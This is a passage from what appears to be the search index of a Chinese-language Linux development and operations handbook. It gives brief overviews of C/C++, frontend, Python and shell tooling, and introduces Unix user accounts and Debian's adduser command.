<p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>\u200b\u9002\u7528\u8303\u56f4\u200b</p> <p>C/C++ \u200b\u7684\u200b\u9002\u7528\u8303\u56f4\u200b\u975e\u5e38\u200b\u5e7f\u6cdb\u200b\uff0c\u200b\u51e0\u4e4e\u200b\u53ef\u4ee5\u200b\u9002\u7528\u200b\u4e8e\u200b\u8ba1\u7b97\u673a\u200b\u7684\u200b\u5404\u79cd\u200b\u9886\u57df\u200b\uff0c\u200b\u901a\u5e38\u200b\u7528\u4e8e\u200b\u6027\u80fd\u200b\u8981\u6c42\u200b\u8f83\u200b\u9ad8\u200b\u6216\u662f\u200b\u8d44\u6e90\u200b\u53d7\u9650\u200b\u3001\u200b\u8d34\u8fd1\u200b\u5e95\u5c42\u200b\u7684\u200b\u5730\u65b9\u200b\uff0c\u200b\u6bd4\u5982\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u5185\u6838\u200b\u3001\u200b\u6e38\u620f\u200b\u5f15\u64ce\u200b\u3001\u200b\u9ad8\u9891\u200b\u91cf\u5316\u200b\u4ea4\u6613\u200b\u3001\u200b\u5d4c\u5165\u5f0f\u200b\u5f00\u53d1\u200b\u7b49\u200b</p> <p>\u200b\u7279\u70b9\u200b</p> <ul> <li>\u200b\u9ad8\u6027\u80fd\u200b\uff1a\u200b\u7f16\u8bd1\u200b\u4e3a\u200b\u673a\u5668\u7801\u200b\uff0c\u200b\u6ca1\u6709\u200b\u989d\u5916\u200b\u5f00\u9500\u200b</li> <li>\u200b\u624b\u52a8\u200b\u5185\u5b58\u200b\u7ba1\u7406\u200b\uff1a\u200b\u4e0e\u200b\u4e00\u4e9b\u200b\u81ea\u5e26\u200b GC \u200b\u7684\u200b\u8bed\u8a00\u200b\u4e0d\u540c\u200b\uff0cC/C++ \u200b\u8981\u6c42\u200b\u5f00\u53d1\u8005\u200b\u81ea\u884c\u200b\u7ba1\u7406\u200b\u5185\u5b58\u200b</li> <li>\u200b\u751f\u6001\u200b\u5206\u6563\u200b\uff1aC/C++ \u200b\u5e76\u200b\u6ca1\u6709\u200b\u5b98\u65b9\u200b\u7684\u200b\u5305\u200b\u7ba1\u7406\u5668\u200b\uff0c\u200b\u751f\u6001\u200b\u8f83\u4e3a\u200b\u5206\u6563\u200b\uff0c\u200b\u73b0\u6709\u200b\u7684\u200b\u5305\u200b\u7ba1\u7406\u5668\u200b\u3001\u200b\u6784\u5efa\u200b\u5de5\u5177\u200b\u5e76\u200b\u4e0d\u200b\u5b8c\u5584\u200b</li> </ul> <p>\u200b\u53c2\u8003\u8d44\u6599\u200b\uff1a</p> <ul> <li>Linux 101/Ch07</li> <li>C++ Reference</li> <li>CppCon</li> <li>Modern C++ Programming</li> </ul> <p>\u200b\u5e38\u7528\u5de5\u5177\u200b\uff1a</p> <ul> <li>CMake: \u200b\u76ee\u524d\u200b\u6700\u200b\u6d41\u884c\u200b\u7684\u200b\u8de8\u5e73\u53f0\u200b C/C++ \u200b\u6784\u5efa\u200b\u7cfb\u7edf\u200b</li> <li>Meson: \u200b\u4e00\u79cd\u200b\u5f00\u6e90\u200b\u6784\u5efa\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u6bd4\u200b CMake \u200b\u66f4\u52a0\u200b\u7528\u6237\u200b\u53cb\u597d\u200b</li> <li>Xmake: \u200b\u73b0\u4ee3\u5316\u200b\u7684\u200b C/C++ \u200b\u6784\u5efa\u200b\u5de5\u5177\u200b\uff0c\u200b\u62e5\u6709\u200b\u5feb\u901f\u200b\u6784\u5efa\u200b\u3001\u200b\u751f\u6210\u200b\u5de5\u7a0b\u200b\u6587\u4ef6\u200b\u3001\u200b\u5305\u200b\u7ba1\u7406\u200b\u7b49\u200b\u5f3a\u5927\u200b\u529f\u80fd\u200b\uff0c\u200b\u540c\u65f6\u200b\u8f7b\u91cf\u200b\u6613\u4e0a\u200b\u624b\u200b</li> <li>Vcpkg: \u200b\u5fae\u8f6f\u200b\u5f00\u53d1\u200b\u7684\u200b\u514d\u8d39\u200b\u5f00\u6e90\u200b C/C++ \u200b\u5305\u200b\u7ba1\u7406\u5668\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u8de8\u5e73\u53f0\u200b\uff0c\u200b\u80fd\u591f\u200b\u4e0e\u200b CMake \u200b\u7b49\u200b\u6784\u5efa\u200b\u5de5\u5177\u200b\u534f\u4f5c\u200b</li> <li>Conan: \u200b\u53e6\u200b\u4e00\u4e2a\u200b C/C++ \u200b\u7684\u200b\u5305\u200b\u7ba1\u7406\u5668\u200b\uff0c\u200b\u6bd4\u200b Vcpkg \u200b\u66f4\u200b\u65b9\u4fbf\u200b\u5b9a\u5236\u200b</li> </ul> <p>Style Guide:</p> <ul> <li>Google C++ Style Guide</li> </ul> <p>@xiao-h1024: \u200b\u5173\u4e8e\u200b C/C++ \u200b\u751f\u6001\u200b\u7684\u200b\u5410\u200b\u69fd\u200b</p> <p>C/C++ \u200b\u7684\u200b\u751f\u6001\u200b\u975e\u5e38\u200b\u5206\u6563\u200b\u4e14\u200b\u6df7\u4e71\u200b\uff0c\u200b\u4f60\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\u5404\u79cd\u5404\u6837\u200b\u7684\u200b\u6784\u5efa\u200b\u5de5\u5177\u200b\uff0c\u200b\u6bcf\u4e2a\u200b\u90fd\u200b\u58f0\u79f0\u200b\u81ea\u5df1\u200b\u89e3\u51b3\u200b\u4e86\u200b\u5148\u524d\u200b\u6784\u5efa\u200b\u5de5\u5177\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u7136\u800c\u200b\u73b0\u5b9e\u200b\u662f\u200b\u5404\u200b\u6709\u200b\u5404\u200b\u7684\u200b\u5751\u70b9\u200b\uff0c\u200b\u751f\u6001\u200b\u8fd8\u662f\u200b\u90a3\u6837\u200b\u6df7\u4e71\u200b\u3002\u200b\u60f3\u8981\u200b\u628a\u200b\u7b2c\u4e09\u65b9\u200b\u5e93\u200b\u987a\u5229\u200b\u96c6\u6210\u200b\u5230\u200b\u81ea\u5df1\u200b\u7684\u200b\u9879\u76ee\u200b\u4e2d\u200b\uff0c\u200b\u8fd8\u8981\u200b\u8de8\u5e73\u53f0\u200b\uff0c\u200b\u89e3\u51b3\u200b\u6784\u5efa\u200b\u95ee\u9898\u200b\u7684\u200b\u65f6\u95f4\u200b\u90fd\u200b\u591f\u200b\u5199\u200b\u597d\u591a\u200b\u4ee3\u7801\u200b\u4e86\u200b\uff0c\u200b\u8fd9\u200b\u53ef\u200b\u771f\u662f\u200b\u5669\u68a6\u200b\u3002\u200b\u6240\u4ee5\u200b\u8fd8\u200b\u5f97\u200b\u662f\u200b Rust\uff08\u200b\u9003\u200b</p>"},{"location":"dev/language/frontend/","title":"\u524d\u7aef\u200b\u7b80\u4ecb","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@tiankaima</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>\u200b\u9002\u7528\u8303\u56f4\u200b</p> <p>HTML/CSS/JavaScript \u200b\u5206\u522b\u200b\u8d1f\u8d23\u200b\u7f51\u9875\u200b\u7684\u200b\u7ed3\u6784\u200b\u3001\u200b\u6837\u5f0f\u200b\u548c\u200b\u4ea4\u4e92\u200b\u3002\u200b\u5f97\u76ca\u4e8e\u200b NodeJS \u200b\u7b49\u200b\u6280\u672f\u200b\u7684\u200b\u53d1\u5c55\u200b\uff0cJavaScript \u200b\u4e0d\u5fc5\u200b\u53d7\u9650\u200b\u5728\u200b\u6d4f\u89c8\u5668\u200b\u4e2d\u200b\u8fd0\u884c\u200b\uff0c\u200b\u5e94\u7528\u200b\u573a\u666f\u200b\u66f4\u52a0\u200b\u5e7f\u6cdb\u200b\u3002</p> <p>\u200b\u4f7f\u7528\u200b\u573a\u666f\u200b\uff1aWeb \u200b\u5f00\u53d1\u200b\u3001\u200b\u8de8\u5e73\u53f0\u200b\u5e94\u7528\u200b\u5f00\u53d1\u200b\u7b49\u200b\u3002</p> <p>\u200b\u7279\u70b9\u200b</p> <ul> <li>\u200b\u8f83\u200b\u5b8c\u5584\u200b\u7684\u200b\u793e\u533a\u200b\u751f\u6001\u200b\uff1a\u200b\u6709\u200b\u5927\u91cf\u200b\u7684\u200b\u5e93\u200b\u3001\u200b\u811a\u624b\u67b6\u200b\u3001\u200b\u6a21\u677f\u200b\u7b49\u200b\u3002</li> <li>JavaScript \u200b\u5b58\u5728\u200b\u592a\u200b\u591a\u200b\u8bed\u8a00\u200b\u7279\u6027\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u4f8b\u5982\u200b equality, this \u200b\u7b49\u200b\u3002</li> </ul> <p>\u200b\u53c2\u8003\u8d44\u6599\u200b\uff1a</p> <ul> <li>MDN Web Docs: \u200b\u767e\u79d1\u5168\u4e66\u200b</li> </ul> <p>\u200b\u5e38\u7528\u5de5\u5177\u200b\uff1a</p> <ul> <li>\u200b\u4f5c\u4e3a\u200b JavaScript \u200b\u7684\u200b\u66ff\u4ee3\u54c1\u200b\uff0cTypeScript \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u9759\u6001\u200b\u7c7b\u578b\u200b\u68c0\u67e5\u200b\u3001\u200b\u66f4\u597d\u200b\u7684\u200b OOP \u200b\u652f\u6301\u200b\uff0c\u200b\u8303\u578b\u200b\u3001\u200b\u88c5\u9970\u200b\u5668\u200b\uff0c\u200b\u66f4\u597d\u200b\u7684\u200b ECMAScript \u200b\u7279\u6027\u200b\u652f\u6301\u200b<ul> <li>\u200b\u4f34\u968f\u200b\u7740\u200b\u8fd9\u4e9b\u200b\u7279\u6027\u200b\uff0c\u200b\u4e00\u822c\u800c\u8a00\u200b\uff0cIDE \u200b\u652f\u6301\u200b\u4e5f\u200b\u66f4\u52a0\u200b\u53cb\u597d\u200b\u3002</li> <li>TypeScript \u200b\u4e00\u822c\u200b\u4f5c\u4e3a\u200b npm \u200b\u811a\u624b\u67b6\u200b\u4f7f\u7528\u200b\uff0c\u200b\u5728\u200b\u7f16\u8bd1\u200b\u671f\u200b\u8f6c\u4e3a\u200b\u65e0\u200b\u7c7b\u578b\u200b\u68c0\u67e5\u200b\u7684\u200b JavaScript\u3002</li> </ul> </li> <li>SCSS: \u200b\u4e00\u4e2a\u200b CSS \u200b\u9884\u200b\u5904\u7406\u5668\u200b\uff0c\u200b\u63d0\u4f9b\u200b\u4e86\u200b\u53d8\u91cf\u200b\u3001\u200b\u5d4c\u5957\u200b\u3001\u200b\u6df7\u5408\u200b\u7b49\u200b\u529f\u80fd\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u63d0\u9ad8\u200b CSS \u200b\u7684\u200b\u53ef\u7ef4\u62a4\u6027\u200b\u3002</li> <li>Webpack: \u200b\u4e00\u4e2a\u200b\u6a21\u5757\u200b\u6253\u5305\u200b\u5de5\u5177\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u5c06\u200b\u591a\u4e2a\u200b JavaScript \u200b\u6587\u4ef6\u200b\u6253\u5305\u200b\u6210\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\uff0c\u200b\u63d0\u9ad8\u200b\u9875\u9762\u200b\u52a0\u8f7d\u200b\u901f\u5ea6\u200b\u3002</li> </ul> <p>\u200b\u5e38\u7528\u200b\u6846\u67b6\u200b\uff1a</p> <ul> <li>\u200b\u524d\u7aef\u5f00\u53d1\u200b<ul> <li>React: \u200b\u4e00\u4e2a\u200b\u7528\u4e8e\u200b\u6784\u5efa\u200b\u7528\u6237\u754c\u9762\u200b\u7684\u200b JavaScript \u200b\u5e93\u200b</li> <li>Vue: \u200b\u4e00\u5957\u200b\u7528\u4e8e\u200b\u6784\u5efa\u200b\u7528\u6237\u754c\u9762\u200b\u7684\u200b\u6e10\u8fdb\u5f0f\u200b\u6846\u67b6\u200b</li> </ul> </li> <li>\u200b\u8de8\u5e73\u53f0\u200b\u5e94\u7528\u200b\u5f00\u53d1\u200b<ul> <li>Electron: \u200b\u4f7f\u7528\u200b Web \u200b\u6280\u672f\u200b\u6784\u5efa\u200b\u8de8\u5e73\u53f0\u200b\u684c\u9762\u200b\u5e94\u7528\u200b</li> <li>React Native: \u200b\u4f7f\u7528\u200b React \u200b\u6784\u5efa\u200b\u539f\u751f\u200b\u5e94\u7528\u200b\uff0c\u200b\u4e3b\u8981\u200b\u7528\u4e8e\u200b\u79fb\u52a8\u200b\u7aef\u200b\u5f00\u53d1\u200b</li> </ul> </li> </ul>"},{"location":"dev/language/golang/","title":"Golang","text":"<p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p>"},{"location":"dev/language/python/","title":"Python","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@tiankaima</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>\u200b\u9002\u7528\u8303\u56f4\u200b</p> <p>Python \u200b\u7684\u200b\u9002\u7528\u8303\u56f4\u200b\u66f4\u52a0\u200b\u5e7f\u6cdb\u200b, \u200b\u5e38\u7528\u200b\u5728\u200b Web \u200b\u5f00\u53d1\u200b, \u200b\u4ee5\u53ca\u200b\u5404\u79cd\u200b\u79d1\u5b66\u8ba1\u7b97\u200b\u3001\u200b\u6570\u636e\u5904\u7406\u200b\u3001\u200b\u673a\u5668\u200b\u5b66\u4e60\u200b\u7b49\u200b\u9886\u57df\u200b\u3002</p> <p>\u200b\u7279\u70b9\u200b</p> <ul> <li>\u200b\u793e\u533a\u200b\u751f\u6001\u200b\u5b8c\u5584\u200b\uff0c\u200b\u6709\u200b\u5927\u91cf\u200b\u7684\u200b\u7b2c\u4e09\u65b9\u200b\u5e93\u200b\uff0c\u200b\u4f8b\u5982\u200b Django\u3001Flask\u3001numpy\u3001pandas \u200b\u7b49\u200b\u3002</li> <li>\u200b\u8bed\u6cd5\u200b\u7b80\u6d01\u200b\uff0c\u200b\u6613\u4e8e\u200b\u5b66\u4e60\u200b\uff0c\u200b\u9002\u5408\u200b\u521d\u5b66\u8005\u200b\u3002</li> <li>\u300c\u200b\u5e74\u957f\u200b\u4f46\u200b\u6070\u9022\u200b\u65b0\u6625\u200b\u300d, \u200b\u5373\u200b\u6ca1\u6709\u200b C++ \u200b\u90a3\u6837\u200b\u7684\u200b\u5386\u53f2\u200b\u5305\u88b1\u200b\uff0c\u200b\u4e5f\u200b\u6ca1\u6709\u200b\u65b0\u578b\u200b\u8bed\u8a00\u200b\u90a3\u6837\u200b\u7684\u200b\u4e0d\u7a33\u5b9a\u6027\u200b\u3001\u200b\u4e0d\u200b\u6210\u719f\u6027\u200b\u3002</li> <li>\u200b\u7c7b\u578b\u200b\u68c0\u67e5\u200b\u4e0d\u200b\u4e25\u683c\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e5f\u200b\u6709\u200b\u5b8c\u6574\u200b\u7684\u200b\u7c7b\u578b\u200b\u68c0\u67e5\u200b\u5de5\u5177\u200b (mypy)\u3002</li> </ul> <p>\u200b\u53c2\u8003\u8d44\u6599\u200b\uff1a</p> <ul> <li>Linux 101/Ch07</li> <li>Python \u200b\u5b98\u65b9\u200b\u6587\u6863\u200b</li> </ul> <p>Style Guide:</p> <ul> <li>Style Guide for Python Code</li> </ul> <p>\u200b\u5728\u200b\u638c\u63e1\u200b\u57fa\u7840\u200b\u7684\u200b\u5de5\u5177\u200b\u94fe\u200b\u3001\u200b\u8bed\u6cd5\u200b\u4e4b\u540e\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u4ece\u200b\u4e0b\u9762\u200b\u51e0\u4e2a\u200b\u65b9\u9762\u200b\u8fdb\u4e00\u6b65\u200b\u5b66\u4e60\u200b\uff1a</p> <ul> <li>FastAPI: \u200b\u5c1d\u8bd5\u200b\u5199\u200b\u4e00\u4e2a\u200b\u7b80\u5355\u200b\u7684\u200b API \u200b\u670d\u52a1\u200b</li> <li>Python Data Science Handbook: \u200b\u4e86\u89e3\u200b Python \u200b\u5728\u200b\u6570\u636e\u200b\u79d1\u5b66\u200b\u9886\u57df\u200b\u7684\u200b\u5e94\u7528\u200b</li> <li>PyTorch: \u200b\u4e86\u89e3\u200b PyTorch \u200b\u7684\u200b\u4f7f\u7528\u200b</li> <li>TensorFlow: \u200b\u4e86\u89e3\u200b TensorFlow \u200b\u7684\u200b\u4f7f\u7528\u200b</li> <li>Python Cookbook: \u200b\u6df1\u5165\u200b\u4e86\u89e3\u200b Python \u200b\u7684\u200b\u4e00\u4e9b\u200b\u7279\u6027\u200b</li> </ul> <p>\u200b\u5728\u200b\u8fd9\u4e9b\u200b\u8fc7\u7a0b\u200b\u4e2d\u200b\uff0cPython \u200b\u8bed\u8a00\u200b\u672c\u8eab\u200b\u53ef\u80fd\u200b\u4e0d\u4f1a\u200b\u662f\u200b\u4e00\u4e2a\u200b\u8f83\u5927\u200b\u7684\u200b\u969c\u788d\u200b\uff0c\u200b\u4f46\u662f\u200b\u5b89\u88c5\u200b\u3001\u200b\u914d\u7f6e\u200b\u7b49\u200b\u65b9\u9762\u200b\u53ef\u80fd\u200b\u5b58\u5728\u200b\u4e00\u70b9\u200b\u969c\u788d\u200b\uff0c\u200b\u4ee5\u4e0b\u200b\u662f\u200b\u4e00\u4e9b\u200b\u5e38\u89c1\u200b\u7684\u200b\u95ee\u9898\u200b\uff0c\u200b\u6211\u4eec\u200b\u63d0\u524d\u200b\u6574\u7406\u200b\u5728\u200b\u8fd9\u91cc\u200b\uff1a</p> <ul> <li>Python 3.12 importlib: \u200b\u5bfc\u81f4\u200b\u4e86\u200b\u90e8\u5206\u200b\u5e93\u200b\u5386\u53f2\u200b\u7248\u672c\u200b\u7684\u200b\u517c\u5bb9\u95ee\u9898\u200b (\u200b\u4f8b\u5982\u200b <code>numpy~=1.23</code>), \u200b\u5982\u679c\u200b\u9700\u8981\u200b\u5bf9\u5e94\u200b\u5305\u200b\u7684\u200b\u5386\u53f2\u200b\u7248\u672c\u200b\uff0c\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u964d\u7ea7\u200b Python (\u200b\u6216\u8005\u200b\u6307\u5b9a\u200b <code>python310</code> / \u200b\u4f7f\u7528\u200b conda \u200b\u7b49\u200b)</li> <li>Poetry Pytorch: Poetry \u200b\u4e0e\u200b Pytorch \u200b\u7684\u200b\u517c\u5bb9\u95ee\u9898\u200b\uff0c\u200b\u53ef\u80fd\u200b\u9700\u8981\u200b\u624b\u52a8\u200b\u5b89\u88c5\u200b Pytorch</li> </ul>"},{"location":"dev/language/shell/","title":"Shell \u200b\u811a\u672c","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@tiankaima</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p> <p>\u200b\u9002\u7528\u8303\u56f4\u200b</p> <p>Shell \u200b\u4e5f\u8bb8\u200b\u662f\u200b\u4e0e\u200b Linux \u200b\u6253\u4ea4\u9053\u200b (\u200b\u65e5\u5e38\u200b\u7ef4\u62a4\u200b\u3001\u200b\u5b89\u88c5\u200b\u7b49\u200b) \u200b\u6700\u200b\u76f4\u63a5\u200b\u7684\u200b\u65b9\u5f0f\u200b\u3002 \u200b\u5728\u200b\u6b64\u57fa\u7840\u200b\u4e0a\u200b\u9010\u6e10\u200b\u53d1\u5c55\u200b\u51fa\u200b\u4e86\u200b\u9700\u8981\u200b\u4f7f\u7528\u200b\u53d8\u91cf\u200b\u3001\u200b\u63a7\u5236\u6d41\u200b\u7684\u200b Shell Script\u3002</p> <p>Shell Script \u200b\u7684\u200b\u9002\u7528\u8303\u56f4\u200b\uff1a\u200b\u81ea\u52a8\u5316\u200b\u3001\u200b\u4e0d\u200b\u6d89\u53ca\u200b\u6838\u5fc3\u200b\u4e1a\u52a1\u200b\u7684\u200b\u6d41\u7a0b\u200b (\u200b\u4f8b\u5982\u200b\u5468\u671f\u6027\u200b\u6267\u884c\u200b\u7684\u200b\u4efb\u52a1\u200b\u3001\u200b\u7f16\u8bd1\u200b\u3001\u200b\u5b89\u88c5\u200b\u811a\u672c\u200b) \u200b\u7b49\u200b\uff0c\u200b\u901a\u8fc7\u200b Shell \u200b\u53ef\u4ee5\u200b\u5f88\u200b\u65b9\u4fbf\u200b\u7684\u200b\u8c03\u7528\u200b\u5176\u4ed6\u200b\u547d\u4ee4\u200b\u3001\u200b\u6279\u91cf\u200b\u5904\u7406\u200b\u6587\u4ef6\u200b/\u200b\u76ee\u5f55\u200b\u7b49\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u200b\u9002\u5408\u200b\u7f16\u5199\u200b\u5927\u578b\u200b\u7a0b\u5e8f\u200b\u3002</p> <p>\u200b\u7279\u70b9\u200b</p> <ul> <li>\u200b\u4f5c\u4e3a\u200b\u811a\u672c\u8bed\u8a00\u200b\uff0cShell Script \u200b\u53ea\u200b\u63d0\u4f9b\u200b\u57fa\u672c\u200b\u7684\u200b\u53d8\u91cf\u200b\u3001\u200b\u63a7\u5236\u6d41\u200b\u3001\u200b\u51fd\u6570\u200b\u7b49\u200b\uff0c\u200b\u51e0\u4e4e\u200b\u6ca1\u6709\u200b\u9762\u5411\u5bf9\u8c61\u200b\u7684\u200b\u7279\u6027\u200b\u3002</li> <li>Shell Script \u200b\u9002\u5408\u200b\u5904\u7406\u200b\u6587\u672c\u200b\u3001\u200b\u8c03\u7528\u200b\u7cfb\u7edf\u547d\u4ee4\u200b\u7b49\u200b\uff0c\u200b\u4f46\u662f\u200b\u4e0d\u200b\u9002\u5408\u200b\u5904\u7406\u200b\u590d\u6742\u200b\u7684\u200b\u6570\u636e\u7ed3\u6784\u200b\u3002</li> <li>\u200b\u771f\u6b63\u200b\u610f\u4e49\u200b\u4e0a\u200b\u7684\u200b\u5f00\u7bb1\u200b\u5373\u7528\u200b\uff0c\u200b\u65e0\u9700\u200b\u989d\u5916\u200b\u5b89\u88c5\u200b\uff0c\u200b\u56e0\u6b64\u200b\u5e38\u7528\u200b\u5728\u200b\u5b89\u88c5\u200b\u3001\u200b\u7f16\u8bd1\u200b\u7b49\u200b\u573a\u666f\u200b\u3002</li> </ul> <p>\u200b\u53c2\u8003\u8d44\u6599\u200b\uff1a</p> <ul> <li>Linux 101/Ch06</li> <li>The Missing Semester of Your CS Education/shell-tools</li> </ul> <p>\u200b\u4f5c\u4e3a\u200b\u8865\u5145\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u67e5\u9605\u200b\uff1a</p> <ul> <li>jq: \u200b\u7528\u4e8e\u200b\u5904\u7406\u200b JSON \u200b\u6570\u636e\u200b</li> <li>yq: \u200b\u7528\u4e8e\u200b\u5904\u7406\u200b YAML \u200b\u6570\u636e\u200b</li> </ul> Shell tools <p>\u200b\u4e00\u4e2a\u200b\u5e38\u89c1\u200b\u7684\u200b\u63d0\u5347\u200b\u65e5\u5e38\u200b\u6548\u7387\u200b\u7684\u200b\u529e\u6cd5\u200b\u662f\u200b: \u200b\u4f7f\u7528\u200b oh-my-zsh\u3001fzf\u3001tmux \u200b\u7b49\u200b\u5de5\u5177\u200b\u3002</p>"},{"location":"ops/","title":"\u8fd0\u7ef4\u200b\u57fa\u7840","text":"<p>\u200b\u672c\u200b\u90e8\u5206\u200b\u4ecb\u7ecd\u200b\u8fd0\u7ef4\u200b Linux \u200b\u7cfb\u7edf\u200b\u6240\u200b\u9700\u200b\u7684\u200b\u57fa\u7840\u77e5\u8bc6\u200b\u3002\u200b\u53ef\u200b\u5728\u200b\u76ee\u5f55\u200b\u4e2d\u200b\u9009\u62e9\u200b\u60f3\u8981\u200b\u9605\u8bfb\u200b\u7684\u200b\u5177\u4f53\u200b\u7ae0\u8282\u200b\u3002</p>"},{"location":"ops/accounts/","title":"\u7528\u6237\u200b\u8d26\u6237\u200b\u7cfb\u7edf","text":"<p>\u200b\u4e3b\u8981\u200b\u4f5c\u8005\u200b</p> <p>@iBug</p> <p>\u200b\u672c\u6587\u200b\u7f16\u5199\u200b\u4e2d\u200b</p>"},{"location":"ops/accounts/#unix-users","title":"Unix \u200b\u7528\u6237","text":"<p>Linux \u200b\u91c7\u7528\u200b Unix \u200b\u7528\u6237\u200b\u7cfb\u7edf\u200b\uff0c\u200b\u5373\u200b\u901a\u8fc7\u200b\u4e00\u4e2a\u200b\u6570\u5b57\u200b ID \u200b\u6765\u200b\u6807\u8bc6\u200b\u7528\u6237\u200b\uff0c\u200b\u79f0\u4e3a\u200b UID\u3002 UID 0 \u200b\u901a\u5e38\u200b\u79f0\u4e3a\u200b root \u200b\u7528\u6237\u200b\uff0c\u200b\u5177\u6709\u200b\u64cd\u4f5c\u7cfb\u7edf\u200b\u7684\u200b\u6700\u9ad8\u200b\u7ba1\u7406\u6743\u9650\u200b\uff0c\u200b\u800c\u200b\u975e\u200b\u96f6\u200b UID \u200b\u7684\u200b\u7528\u6237\u200b\u4e0d\u200b\u5177\u6709\u200b\u7279\u6b8a\u200b\u7684\u200b\u6743\u9650\u200b\u3002</p> <p>\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0c\u200b\u7528\u6237\u7ec4\u200b\u4e5f\u200b\u901a\u8fc7\u200b\u6570\u5b57\u200b ID \u200b\u6765\u200b\u6807\u8bc6\u200b\uff0c\u200b\u79f0\u4e3a\u200b GID\u3002 \u200b\u7528\u6237\u7ec4\u200b\u7684\u200b GID 0 \u200b\u901a\u5e38\u200b\u79f0\u4e3a\u200b root \u200b\u7ec4\u200b\uff0c\u200b\u4f46\u200b\u4e00\u822c\u200b\u6ca1\u6709\u200b\u7279\u6b8a\u200b\u7684\u200b\u6743\u9650\u200b\u3002</p> <p>\u200b\u5728\u200b Debian \u200b\u53ca\u5176\u200b\u884d\u751f\u200b\u53d1\u884c\u7248\u200b\u4e2d\u200b\uff0cUID \u200b\u548c\u200b GID \u200b\u7684\u200b\u8303\u56f4\u200b 0-999 \u200b\u662f\u200b\u7cfb\u7edf\u200b\u7528\u6237\u200b\u548c\u200b\u7ec4\u200b\uff0c\u200b\u8303\u56f4\u200b 1000-59999 \u200b\u662f\u200b\u666e\u901a\u7528\u6237\u200b\u548c\u200b\u7ec4\u200b\uff0c\u200b\u8303\u56f4\u200b 60000-65533 \u200b\u662f\u200b\u52a8\u6001\u5206\u914d\u200b\u7684\u200b\u7528\u6237\u200b\u548c\u200b\u7ec4\u200b\uff0c65534 \u200b\u4e3a\u200b <code>nobody</code> \u200b\u7528\u6237\u200b\u548c\u200b <code>nogroup</code> \u200b\u7ec4\u200b\u3002 \u200b\u5176\u4e2d\u200b UID/GID \u200b\u8303\u56f4\u200b 0-100 \u200b\u7531\u200b Debian \u200b\u4fdd\u7559\u200b\u5206\u914d\u200b\uff0c\u200b\u786e\u4fdd\u200b\u5728\u200b\u6240\u6709\u200b Debian \u200b\u7cfb\u7edf\u200b\u4e2d\u200b\u90fd\u200b\u4fdd\u6301\u4e00\u81f4\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>sudo</code>, <code>www-data</code> \u200b\u548c\u200b <code>users</code> \u200b\u7ec4\u200b\u7684\u200b GID \u200b\u5206\u522b\u200b\u56fa\u5b9a\u200b\u4e3a\u200b 27, 33 \u200b\u548c\u200b 100\u3002</p>"},{"location":"ops/accounts/#adduser","title":"\u6dfb\u52a0\u200b\u4e0e\u200b\u5220\u9664\u200b\u7528\u6237","text":"<p>Debian \u200b\u63d0\u4f9b\u200b\u4e86\u200b\u7528\u6237\u200b\u53cb\u597d\u200b\u7684\u200b <code>adduser</code> \u200b\u548c\u200b <code>deluser</code> \u200b\u547d\u4ee4\u200b\u6765\u200b\u6dfb\u52a0\u200b\u548c\u200b\u5220\u9664\u200b\u7528\u6237\u200b\uff0c\u200b\u7531\u200b\u8f6f\u4ef6\u5305\u200b <code>adduser</code> \u200b\u63d0\u4f9b\u200b\uff0c\u200b\u5373\u200b\uff1a</p> <pre><code>apt install adduser\n</code></pre> <p><code>adduser</code> \u200b\u547d\u4ee4\u200b\u4f1a\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u65b0\u200b\u7684\u200b\u7528\u6237\u200b\uff0c\u200b\u4e3a\u200b\u5176\u200b\u521b\u5efa\u200b\u4e00\u4e2a\u200b\u4e3b\u76ee\u5f55\u200b\uff0c\u200b\u5e76\u200b\u6307\u5bfc\u200b\u7ba1\u7406\u5458\u200b\uff08\u200b\u8fd0\u884c\u200b <code>adduser</code> \u200b\u547d\u4ee4\u200b\u7684\u200b\u4eba\u200b\uff09\u200b\u4e3a\u200b\u65b0\u200b\u7528\u6237\u200b\u8bbe\u7f6e\u200b\u5bc6\u7801\u200b\u548c\u200b\u5907\u6ce8\u200b\u4fe1\u606f\u200b\u3002</p> <p>adduser \u200b\u7684\u200b\u4e00\u4e9b\u200b\u9ed8\u8ba4\u200b\u884c\u4e3a\u200b\u53ef\u4ee5\u200b\u901a\u8fc7\u200b <code>/etc/adduser.conf</code> \u200b\u6587\u4ef6\u200b\u8fdb\u884c\u200b\u914d\u7f6e\u200b\uff0c\u200b\u4f8b\u5982\u200b\u6307\u5b9a\u200b\u7cfb\u7edf\u200b\u7528\u6237\u200b\u548c\u200b\u666e\u901a\u7528\u6237\u200b\u7684\u200b UID \u200b\u8303\u56f4\u200b\uff0c\u200b\u4ee5\u53ca\u200b\u9ed8\u8ba4\u200b shell\uff08<code>DSHELL</code>\uff09\u200b\u7b49\u200b\u3002 \u200b\u4f7f\u7528\u200b adduser \u200b\u547d\u4ee4\u200b\u7684\u200b\u4e00\u4e2a\u200b\u4f8b\u5b50\u200b\u5982\u4e0b\u200b\uff1a</p> <pre><code># adduser test\ninfo: Adding user 